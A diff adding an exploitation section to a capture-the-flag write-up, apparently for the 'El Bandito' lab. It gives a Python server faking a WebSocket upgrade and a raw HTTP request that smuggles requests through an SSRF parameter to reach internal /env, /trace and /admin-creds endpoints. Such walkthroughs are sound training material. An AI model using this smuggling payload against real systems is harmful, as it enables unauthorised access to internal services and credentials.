@@ -304,3 +304,102 @@ Several observations made this functionality highly suspicious:
 The presence of the `bandito.websocket.thm` hostname also suggested that a WebSocket-related service might exist internally within the infrastructure.
 
 At this stage, the assessment shifted toward testing whether the `/isOnline` functionality could be abused to interact with internal services or smuggle crafted requests through the backend application.
+
+## Exploiting the WebSocket Upgrade Mechanism
+
+To exploit the suspected backend proxy behavior, a custom Python HTTP server was created to return a `101 Switching Protocols` response, simulating a successful WebSocket upgrade.
+
+### Malicious Upgrade Server
+
+```python
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+if len(sys.argv)-1 != 1:
+    print("Usage: {}".format(sys.argv[0]))
+    sys.exit()
+
+class Redirect(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.protocol_version = "HTTP/1.1"
+        self.send_response(101)
+        self.end_headers()
+
+HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
+```
+
+The server was started locally using:
+
+```bash
+python3 server.py 9000
+```
+
+The supplied argument specifies the listening port for the malicious server.
+
+The objective was to abuse the backend's handling of WebSocket upgrade requests and smuggle additional HTTP requests through the connection.
+
+A crafted request was sent through Burp Repeater:
+
+```http
+GET /isOnline?url=http://10.10.101.122:9000 HTTP/1.1
+Host: 10.10.91.160:8080
+Set-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==late, br
+
+GET /env HTTP/1.1
+Host: 10.10.91.160:8080
+```
+
+### Important Notes
+
+* The payload only worked when **two blank lines** were left after the smuggled request inside Burp Repeater.
+* Burp Repeater's **Update Content-Length** option had to be disabled.
+* The backend incorrectly trusted the upgraded connection and processed the smuggled request internally.
+
+Successful exploitation allowed access to the restricted `/env` endpoint.
+
+### `/env` Response
+
+![env Response](../assets/images/El-Bandito-env.png)
+
+The same technique was then used against the `/trace` endpoint simply by replacing:
+
+```text
+/env
+```
+
+with:
+
+```text
+/trace
+```
+
+### `/trace` Response
+
+![trace Response](../assets/images/El-Bandito-trace.png)
+
+The `/trace` response exposed additional sensitive internal paths:
+
+```text
+/admin-creds
+/admin-flag
+```
+
+Using the exact same smuggling technique, requests were crafted to retrieve the contents of both endpoints.
+
+### `/admin-creds` Response
+
+![admin-creds Response](../assets/images/El-Bandito-admin-creds.png)
+
+The retrieved credentials provided administrative access required to continue the challenge.
+
+The `/admin-flag` endpoint exposed the first web flag.
+
+### `/admin-flag` Response
+
+![admin-flag Response](../assets/images/El-Bandito-admin-flag.png)
+
+This vulnerability demonstrated a critical flaw in the backend's handling of WebSocket upgrade requests and internal request parsing, ultimately enabling HTTP request smuggling and unauthorized access to restricted internal resources.
+
